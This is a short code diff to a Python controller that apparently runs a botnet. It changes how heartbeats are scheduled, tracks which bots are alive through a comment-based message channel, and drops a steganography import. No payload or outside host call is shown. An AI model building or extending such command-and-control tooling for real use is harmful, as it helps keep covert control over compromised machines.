@@ -4,13 +4,14 @@ import datetime
 import utils
 from utils import Command
 import log
-import stegano
 
 SHOW_INFO = True
 LOGFILE = '.controllog'
-BOT_TTL = 6  # After how many skipped heartbeats is bot considered dead.
+HEARTBEAT_FREQUENCY = 5  # How many communication channel checks between every heartbeat broadcast. (Time between two heartbeats is equal to `HEARTBEAT_FREQUENCY * utils.REFRESH_DELAY`.)
+BOT_TTL = 7  # After how many skipped bot-checks is bot considered dead. (Should be set as >= HEARTBEAT_FREQUENCY.)
 
 LAST_COMMENT = 0
+HEARTBEAT_COUNTDOWN = 0
 ALIVE_BOTS = {}
 
 
@@ -21,14 +22,21 @@ def error(args):
 
 
 def heartbeat():
-    global LAST_COMMENT
+    global LAST_COMMENT, HEARTBEAT_COUNTDOWN, HEARTBEAT_FREQUENCY
+
     LAST_COMMENT = utils.get_last_comment_id()
     log.add_log_entry(SHOW_INFO, LOGFILE, log.InitEntry(LAST_COMMENT))
 
     while True:
-        send_heartbeat()
+        if HEARTBEAT_COUNTDOWN == 0:
+            send_heartbeat()
+            HEARTBEAT_COUNTDOWN = HEARTBEAT_FREQUENCY - 1
+        else:
+            HEARTBEAT_COUNTDOWN -= 1
+
         if SHOW_INFO: print("SLEEP\n")
         time.sleep(utils.REFRESH_DELAY)
+
         check_bots()
 
 
@@ -38,6 +46,7 @@ def send_heartbeat():
 
 def check_bots():
     global LAST_COMMENT, ALIVE_BOTS, BOT_TTL
+
     messages, LAST_COMMENT = utils.get_fresh_messages(LAST_COMMENT)
 
     tick_bots()
